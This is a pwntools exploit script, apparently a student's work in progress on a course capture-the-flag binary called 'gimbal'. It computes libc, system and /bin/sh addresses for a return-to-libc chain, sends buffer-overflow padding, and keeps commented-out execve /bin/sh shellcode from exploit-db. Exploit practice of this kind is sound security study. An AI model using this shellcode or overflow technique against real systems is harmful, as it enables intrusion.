import os
import string
import struct
from itertools import chain
from typing import Any, Iterable, List

from pwn import *

binary = './gimbal'
context.binary = binary
context.terminal = ['tilix', '-e']

def flatten(items: Iterable) -> List[Any]:
    return list(chain.from_iterable(items))

def make_breakpoints(breakpoints: List[str]) -> List[str]:
    return list(map(lambda b: f'b* {b}', breakpoints))

def make_commands(args: List[str]) -> List[str]:
    return flatten(map(lambda a: ['-ex', a], args))

breakpoints = [
    # '&main',
    '0x4006eb', # After first fgets
    '0x400705', # After loop
    # '0x4006ae', # After read
    '0x4006b5', # do_it RET
]

print_statements = [
    'set follow-fork-mode parent'
]

breakpoints = make_breakpoints(breakpoints)
commands = make_commands(breakpoints + print_statements)

vuln = 0x004006b6


puts_addr = 0x7ffff7e24f90

libc = ELF('./lib/libc.so.6')
libc_base = puts_addr - libc.symbols['puts']
print(hex(libc_base))
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + 0x18cd57
print(hex(system_addr))
print(hex(bin_sh_addr))


pop_rdi_ret = 0x00400793 #0x0000000000400793 : pop rdi ; ret

with process(['pwndbg', binary] + commands) as p:
# with remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1338) as p:

    is_remote = isinstance(p, remote)

    if is_remote:
        p.recvuntil(b'Please input your NetID (something like abc123): ')
        p.sendline(b'nf2137')

    if not is_remote:
        p.sendline(b'r')

    

    # char_arr_start = int(p.recvline()[:14], 16)
    # log.info("Starting address at: %s", hex(char_arr_start))

    # # From https://www.exploit-db.com/shellcodes/47008
    # shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'

    # log.info("Shellcode length: %d", len(shellcode))

    # payload = shellcode
    # payload += b'\x90' * (40 - len(shellcode))
    # payload += struct.pack("<Q", char_arr_start)

    # log.info("Payload length: %d", len(payload))

    p.recvuntil(b"what is your name?")

    # payload = struct.pack("<Q", pop_rdi_ret) * int(8192 / 8)
    payload = b'A' * 8191

    # print(list(string.ascii_uppercase)[1:])
    # for c in list(string.ascii_uppercase)[1:]:
    #     payload += c.encode() * 8

    p.sendline(payload)

    p.interactive()

    p.recvuntil(b"Wait, who were you again?")

    # payload2 = struct.pack("<Q", pop_rdi_ret) * 48
    payload2 = b'A' * 40

    p.sendline(payload2)

    p.interactive()
